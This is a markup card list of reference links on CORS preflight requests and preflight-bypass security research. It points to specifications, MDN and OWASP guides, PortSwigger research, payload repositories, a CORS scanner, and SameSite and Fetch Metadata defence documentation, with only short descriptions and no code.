::card-group

::card
---
title: MDN — CORS Preflight
icon: i-simple-icons-mozilla
to: https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS#preflighted_requests
target: _blank
---
Official MDN documentation on CORS preflight requests, simple request criteria, and browser decision logic for when OPTIONS is sent.
::

::card
---
title: WHATWG Fetch — CORS Protocol
icon: i-lucide-file-text
to: https://fetch.spec.whatwg.org/#http-cors-protocol
target: _blank
---
The authoritative specification for CORS implementation in browsers, defining exactly when preflight is triggered and how simple requests are classified.
::

::card
---
title: PortSwigger — CORS Research
icon: i-simple-icons-portswigger
to: https://portswigger.net/web-security/cors
target: _blank
---
PortSwigger Web Security Academy CORS vulnerability research with labs covering preflight bypass, origin reflection, and exploitation chains.
::

::card
---
title: HackTricks — CORS Bypass
icon: i-lucide-book-open
to: https://book.hacktricks.wiki/en/pentesting-web/cors-bypass.html
target: _blank
---
Extensive CORS bypass techniques including preflight bypass via Content-Type manipulation, method override, and SameSite cookie interactions.
::

::card
---
title: James Kettle — Exploiting CORS
icon: i-simple-icons-portswigger
to: https://portswigger.net/research/exploiting-cors-misconfigurations-for-bitcoins-and-bounties
target: _blank
---
Foundational research on CORS misconfiguration exploitation demonstrating real-world impact of preflight bypass and origin reflection flaws.
::

::card
---
title: PayloadsAllTheThings — CORS
icon: i-simple-icons-github
to: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/CORS%20Misconfiguration
target: _blank
---
Community payload repository with CORS exploitation payloads including preflight bypass techniques and Content-Type manipulation patterns.
::

::card
---
title: Chrome SameSite Cookie Changes
icon: i-simple-icons-googlechrome
to: https://web.dev/articles/samesite-cookies-explained
target: _blank
---
Google's documentation on SameSite cookie behavior changes in Chrome, including the 2-minute Lax POST exception relevant to preflight bypass exploitation.
::

::card
---
title: W3C CORS Specification
icon: i-lucide-file-text
to: https://www.w3.org/TR/cors/
target: _blank
---
Original W3C specification for Cross-Origin Resource Sharing defining the preflight mechanism and simple request classification criteria.
::

::card
---
title: OWASP — Testing CORS
icon: i-lucide-shield-check
to: https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/11-Client-side_Testing/07-Testing_Cross_Origin_Resource_Sharing
target: _blank
---
OWASP testing guide methodology for CORS vulnerabilities including preflight behavior analysis and bypass testing procedures.
::

::card
---
title: Corsy — CORS Scanner
icon: i-simple-icons-github
to: https://github.com/s0md3v/Corsy
target: _blank
---
Automated CORS misconfiguration scanner that tests for preflight bypass conditions alongside origin reflection and null origin trust.
::

::card
---
title: SameSite Cookie Recipes
icon: i-lucide-cookie
to: https://web.dev/articles/samesite-cookie-recipes
target: _blank
---
Practical guide to SameSite cookie attribute behavior, essential for understanding when credentials are sent cross-origin and how it interacts with preflight bypass.
::

::card
---
title: Fetch Metadata Headers
icon: i-simple-icons-mozilla
to: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Sec-Fetch-Mode
target: _blank
---
Documentation on Sec-Fetch-Mode and Sec-Fetch-Site headers that servers can use to detect and block cross-origin simple requests, the emerging defense against preflight bypass.
::

::